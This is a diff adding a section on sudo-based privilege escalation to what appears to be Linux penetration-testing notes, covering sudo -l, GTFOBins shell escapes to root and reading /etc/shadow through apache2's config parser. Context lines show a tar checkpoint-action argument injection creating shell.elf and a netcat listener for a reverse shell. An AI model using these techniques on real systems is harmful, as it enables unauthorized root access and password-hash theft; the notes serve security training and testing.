@@ -267,3 +267,36 @@ touch /home/user/--checkpoint-action=exec=shell.elf
 nc -nvlp 53
 ``` 
   
+## Sudo 
+sudo is a program which lets users run other programs with the security privileges of other users. By default, that other user will be root.
+A user generally needs to enter their password to use sudo, and they must be permitted access via rule(s) in the /etc/sudoers file.
+Rules can be used to limit users to certain programs, and forgo the password entry requirement.
+  
+Run a program using sudo: 
+sudo <program>
+Run a program as a specific user:
+sudo –u <username> <program>
+List programs a user is allowed (and disallowed) to run:
+sudo -l
+  
+“switch user” (su) 
+sudo su
+If for some reason the su program is not allowed
+sudo -s
+sudo -i
+sudo /bin/bash
+sudo passwd 
+  
+Shell Escape Sequences
+A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/
+sudo -l
+If an escape sequence exists, run the program via sudo and perform the sequence to spawn a root shell.
+  
+Abusing Intended Functionality
+If a program doesn’t have an escape sequence, it may still be possible to use it to escalate privileges.
+If we can read files owned by root, we may be able to extract useful information (e.g. passwords, hashes, keys).
+If we can write to files owned by root, we may be able to insert or modify information.  
+apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand.
+sudo apache2 -f /etc/shadow
+  
+  
